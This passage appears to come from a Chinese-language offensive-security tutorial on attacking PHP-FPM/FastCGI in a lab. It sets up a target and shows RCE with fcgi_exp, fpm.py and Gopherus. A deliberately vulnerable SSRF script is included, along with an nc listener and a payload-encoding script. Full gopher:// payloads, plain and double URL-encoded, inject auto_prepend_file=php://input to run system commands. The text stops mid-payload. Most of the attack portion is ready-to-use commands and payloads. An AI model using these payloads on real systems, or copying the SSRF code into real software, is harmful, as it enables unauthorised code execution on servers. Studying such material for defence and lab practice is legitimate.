<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">whereis</span> php-fpm</pre></td></tr><tr><td data-num="2"></td><td><pre>/usr/sbin/php-fpm7.4    <span class="token comment"># 这是我的靶机上 php-fpm 安装的位置</span></pre></td></tr></table></figure><p>重新启动 Nginx</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> systemctl restart nginx</pre></td></tr></table></figure><p>然后检查 nginx 是否正确启动  <code>systemctl status nginx</code> ：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-958446d81700cd6c2583f8feecdae90bd2201304.png" alt="image-20210430211840986" /></p>
<p>检查 php-fpm 是否正确启动  <code>ps -elf | grep php-fpm</code></p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-be84d0eeb07230f74806b40fc290460c0b6a3869.png" alt="image-20210430211939856" /></p>
<p>这里就可以看出上面所说的存在一个 master 进程和多个 worker 进程。</p>
<p>下面将  <code>/var/www/html</code>  目录下的文件删除，新建一个 index.php，内容可以写上  <code>&lt;?php phpinfo(); ?&gt;</code>  用来检查各项是否正常运行（如果页面为空，查看这篇<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZlaW5pYW84NjUxL2FydGljbGUvZGV0YWlscy81Mjc2ODkxMQ==">文章</span>解决）：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4960b687726c34c527dc239ef908199707f47cc4.png" alt="image-20210430212653572" /></p>
<p>其中 Sever API 处和上图一样说明运行正确。下面我们开始攻击。</p>
<h3 id="利用-fcgi_expgo-攻击"><a class="anchor" href="#利用-fcgi_expgo-攻击">#</a> 利用 fcgi_exp.go 攻击</h3>
<ul>
<li>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dvZmVpd28vd2ViY2dpLWV4cGxvaXRz">https://github.com/wofeiwo/webcgi-exploits</span></li>
</ul>
<p>将该项目下载下来后，进入到 webcgi-exploits/php/Fastcgi，新建一个 fcgiclient 目录，将 fcgiclient.go 放入新建的 fcgiclient 目录中：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8c81e36d551be8c2b25590e5d6b86a8ff7ef98f3.png" alt="image-20210501203013815" /></p>
<p>然后安装 go 环境进行编译：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go build fcgi_exp.go                    <span class="token comment"># 编译 fcgi_exp.go</span></pre></td></tr></table></figure><p>然后直接运行可以看到 fcgi_exp 的使用方法：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-171ff0e80d1f0bb80870a72a9ccb0b9bfb420316.png" alt="image-20210501203132859" /></p>
<p>使用如下命令进行测试</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./fcgi_exp system <span class="token number">192.168</span>.43.82 <span class="token number">9000</span> /var/www/html/index.php <span class="token string">"id"</span></pre></td></tr></table></figure><ul>
<li>system：要使用的 PHP 函数</li>
<li>192.168.43.82：目标机 IP</li>
<li>9000：目标机 fpm 端口</li>
<li>/var/www/html/index.php：已知的位于目标机上的 PHP 文件</li>
<li>id：要执行的系统命令</li>
</ul>
<p>如下图所示，成功执行系统命令，利用成功：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6dd6e7ad9c6d6f3403cdce3404ee647de1f3b2aa.png" alt="image-20210501203235683" /></p>
<h3 id="利用-phith0n-大神的-fpmpy"><a class="anchor" href="#利用-phith0n-大神的-fpmpy">#</a> 利用 phith0n 大神的 <span class="exturl" data-url="aHR0cDovL2ZwbS5weQ==">fpm.py</span></h3>
<ul>
<li>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vcGhpdGgwbi85NjE1ZTI0MjBmMzEwNDhmN2UzMGYzOTM3MzU2Y2Y3NQ==">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</span></li>
</ul>
<blockquote>
<p>“兼容 Python2 和 Python3，方便在内网用。之前好些人总是拿着一个 GO 写的工具在用，又不太好用。实际上理解了 fastcgi 协议，再看看这个源码，就很简单了。“</p>
<p>—— phith0n</p>
</blockquote>
<p>利用方式：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python fpm.py <span class="token number">192.168</span>.43.82 /var/www/html/index.php <span class="token parameter variable">-c</span> <span class="token string">"&lt;?php system('id'); exit(); ?>"</span></pre></td></tr></table></figure><p>如下图所示，成功执行系统命令，利用成功：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-632076f4dd116debbf58e07b59c6032954d8cd1a.png" alt="image-20210501205327308" /></p>
<h2 id="ssrf-中对-fpmfastcgi-的攻击"><a class="anchor" href="#ssrf-中对-fpmfastcgi-的攻击">#</a> SSRF 中对 FPM/FastCGI 的攻击</h2>
<p>有时候 PHP-FPM 也并不会执行绑定在 0.0.0.0 上面，而是 127.0.0.1，这样便避免了将 PHP-FPM 暴露在公网上被攻击者访问，但是如果目标主机上存在 SSRF 漏洞的话，我们便可以通过 SSRF 漏洞攻击内网的 PHP-FPM 。</p>
<ul>
<li>靶 机：Ubuntu（192.168.0.175）</li>
<li>攻击机：Kali（192.168.0.128）</li>
</ul>
<p>在目标机 Web 目录中新建 ssrf.php 文件，写入以下存在 SSRF 漏洞的代码：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// 第二种初始化 curl 的方式</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET['url']); </span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment">/* 进行 curl 配置 */</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不输出 HTTP 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$responseText</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">//var_dump (curl_error ($curl) ); // 如果执行 curl 过程中出现异常，可打开此开关，以便查看异常内容</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">echo</span> <span class="token variable">$responseText</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>此时目标主机存在 SSRF 漏洞，并且通过 SSRF 可以探测到目标主机上 9000 端口上运行的 php-fpm。此时，虽然 php-fpm 没有暴露在公网上，但是由于存在 SSRF 漏洞，我们便可以通过 SSRF 漏洞配合 Gopher 协议去打内网的 php-fpm。</p>
<h3 id="利用-fcgi_exp-攻击"><a class="anchor" href="#利用-fcgi_exp-攻击">#</a> 利用 fcgi_exp 攻击</h3>
<ul>
<li>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dvZmVpd28vd2ViY2dpLWV4cGxvaXRz">https://github.com/wofeiwo/webcgi-exploits</span></li>
</ul>
<p>刚在我们已经演示过了，fcgi_exp 这个工具主要是用来攻击未授权访问 php-fpm 的，所以一些地方需要自己写脚本转换一下 payload。</p>
<p>使用如下命令进行测试：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./fcgi_exp system <span class="token number">192.168</span>.43.82 <span class="token number">9000</span> /var/www/html/index.php <span class="token string">"id"</span></pre></td></tr></table></figure><p>此时显然是不行的，因为在配置端口监听的时候，仅允许监听在 127.0.0.1，不存在 php-fpm 未授权访问，所以说不能攻击成功。我们要通过 SSRF 来从目标机内部攻击 9000 端口。</p>
<p>在攻击机上使用  <code>nc -lvvp 1234 &gt; fcg_exp.txt</code>  监听 1234 端口来接收 payload，另外开启一个终端使用下面的命令发送 payload</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./fcgi_exp system <span class="token number">127.0</span>.0.1 <span class="token number">1234</span> /var/www/html/index.php <span class="token string">"id"</span></pre></td></tr></table></figure><p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a6fbe778f2c9abb940fbdcced49340d13501ae7a.png" alt="image-20210501212934401" /></p>
<p>注意这里攻击的端口是上面监听的端口，目的是将 payload 发送到这个端口，运行后可以使用 Ctrl+C 来结束运行，现在就得到了一个 fcg_exp.txt 的文件，里面是获得的 payload，可以使用  <code>xxd fcg_exp.txt</code>  查看其内容：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-43ecf3fc0a0f070d7c5013bf967848c1c2c26dd0.png" alt="image-20210501213005715" /></p>
<p>文件里的内容有部分是不可见字符，这里需要 url 编码一下，这里写一个 Python 脚本对文件中的内容进行编码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token punctuation">,</span> unquote<span class="token punctuation">,</span> urlencode</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fcg_exp.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>payload <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:9000/_"</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span><span class="token string">"%0D"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%2F"</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>执行上面的 python 脚本生成如下 payload：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>gopher<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token operator">/</span>_<span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>0E<span class="token operator">%</span>02CONTENT_LENGTH56<span class="token operator">%</span>0E<span class="token operator">%</span>04REQUEST_METHODPOST<span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span>5BPHP_VALUEallow_url_include<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20On<span class="token operator">%</span>0Ddisable_functions<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0Dsafe_mode<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20Off<span class="token operator">%</span>0Dauto_prepend_file<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20php<span class="token operator">%</span>3A<span class="token operator">//</span><span class="token builtin">input</span><span class="token operator">%</span>0F<span class="token operator">%</span>17SCRIPT_FILENAME<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">%</span>0D<span class="token operator">%</span>01DOCUMENT_ROOT<span class="token operator">/</span><span class="token operator">%</span>0F<span class="token operator">%</span>10SERVER_SOFTWAREgo<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">%</span>20fcgiclient<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0B<span class="token operator">%</span>09REMOTE_ADDR127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>0F<span class="token operator">%</span>08SERVER_PROTOCOLHTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">008</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>3C<span class="token operator">%</span>3Fphp<span class="token operator">%</span>20system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27id<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bdie<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>0vcdb34oju09b8fd<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">%</span>0D<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span>3F<span class="token operator">%</span>3E</pre></td></tr></table></figure><p>之后我们还要对上面的 payload 进行二次 url 编码，然后将最终的 payload 内容放到？url = 后面发送过去（这里需要进行两次编码，因为这里 GET 会进行一次解码，curl 也会再进行一次解码）：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ssrf<span class="token punctuation">.</span>php?url<span class="token operator">=</span>gopher<span class="token operator">%</span>3A<span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">%</span>3A9000<span class="token operator">/</span>_<span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2508</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2514</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span>250E<span class="token operator">%</span>2502CONTENT_LENGTH56<span class="token operator">%</span>250E<span class="token operator">%</span>2504REQUEST_METHODPOST<span class="token operator">%</span><span class="token number">2509</span><span class="token operator">%</span>255BPHP_VALUEallow_url_include<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span>2520On<span class="token operator">%</span>250Ddisable_functions<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>250Dsafe_mode<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span>2520Off<span class="token operator">%</span>250Dauto_prepend_file<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span>2520php<span class="token operator">%</span>253A<span class="token operator">//</span><span class="token builtin">input</span><span class="token operator">%</span>250F<span class="token operator">%</span>2517SCRIPT_FILENAME<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">%</span>250D<span class="token operator">%</span>2501DOCUMENT_ROOT<span class="token operator">/</span><span class="token operator">%</span>250F<span class="token operator">%</span>2510SERVER_SOFTWAREgo<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">/</span><span class="token operator">%</span>2520fcgiclient<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>250B<span class="token operator">%</span>2509REMOTE_ADDR127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>250F<span class="token operator">%</span>2508SERVER_PROTOCOLHTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2505</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">25008</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span>253C<span class="token operator">%</span>253Fphp<span class="token operator">%</span>2520system<span class="token operator">%</span><span class="token number">2528</span><span class="token operator">%</span>2527id<span class="token operator">%</span><span class="token number">2527</span><span class="token operator">%</span><span class="token number">2529</span><span class="token operator">%</span>253Bdie<span class="token operator">%</span><span class="token number">2528</span><span class="token operator">%</span><span class="token number">2527</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>0vcdb34oju09b8fd<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">%</span>250D<span class="token operator">%</span><span class="token number">2527</span><span class="token operator">%</span><span class="token number">2529</span><span class="token operator">%</span>253B<span class="token operator">%</span>253F<span class="token operator">%</span>253E</pre></td></tr></table></figure><p>如下图所示，命令执行成功：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0d48a3b949e0b08eb8cdcf938cd19bba26976d95.png" alt="image-20210501213240893" /></p>
<h3 id="利用-gopherus-攻击"><a class="anchor" href="#利用-gopherus-攻击">#</a> 利用 Gopherus 攻击</h3>
<ul>
<li>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==">https://github.com/tarunkant/Gopherus</span></li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==">Gopherus</span> 这个工具相比上一个更加方便一下，该工具能生成 Gopher 有效负载，用来利用 SSRF 进行 RCE：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fabafc9950e4769bade61c34c59f1a12be868c21.png" alt="image-20210501213539122" /></p>
<p>下面我们就利用这个工具来执行命令：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python gopherus.py <span class="token parameter variable">--exploit</span> fastcgi</pre></td></tr><tr><td data-num="2"></td><td><pre>/var/www/html/index.php                 <span class="token comment"># 这里输入的是一个已知存在的 php 文件</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">id</span></pre></td></tr></table></figure><p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-de6743220d42ec993b8980937e9577dc42ff3eb7.png" alt="image-20210501213618775" /></p>
<p>如上图所示获得 payload：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>gopher<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token operator">/</span>_<span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>0F<span class="token operator">%</span>10SERVER_SOFTWAREgo<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">%</span>20fcgiclient<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0B<span class="token operator">%</span>09REMOTE_ADDR127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>0F<span class="token operator">%</span>08SERVER_PROTOCOLHTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token operator">%</span>0E<span class="token operator">%</span>02CONTENT_LENGTH54<span class="token operator">%</span>0E<span class="token operator">%</span>04REQUEST_METHODPOST<span class="token operator">%</span>09KPHP_VALUEallow_url_include<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20On<span class="token operator">%</span>0Adisable_functions<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0Aauto_prepend_file<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20php<span class="token operator">%</span>3A<span class="token operator">//</span><span class="token builtin">input</span><span class="token operator">%</span>0F<span class="token operator">%</span>17SCRIPT_FILENAME<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">%</span>0D<span class="token operator">%</span>01DOCUMENT_ROOT<span class="token operator">/</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">006</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>3C<span class="token operator">%</span>3Fphp<span class="token operator">%</span>20system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27id<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bdie<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Made<span class="token operator">-</span>by<span class="token operator">-</span>SpyD3r<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">%</span>0A<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span>3F<span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span></pre></td></tr></table></figure><p>然后进行二次编码后将最终的 payload 内容放到？url = 后面发送过去即可：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">/</span>ssrf<span class="token punctuation">.</span>php?url<span class="token operator">=</span>gopher<span class="token operator">%</span>3A<span class="token operator">%</span>2F<span class="token operator">%</span>2F127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>3A9000<span class="token operator">%</span>2F_<span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2508</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span>250F<span class="token operator">%</span>2510SERVER_SOFTWAREgo<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>2F<span class="token operator">%</span>2520fcgiclient<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>250B<span class="token operator">%</span>2509REMOTE_ADDR127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>250F<span class="token operator">%</span>2508SERVER_PROTOCOLHTTP<span 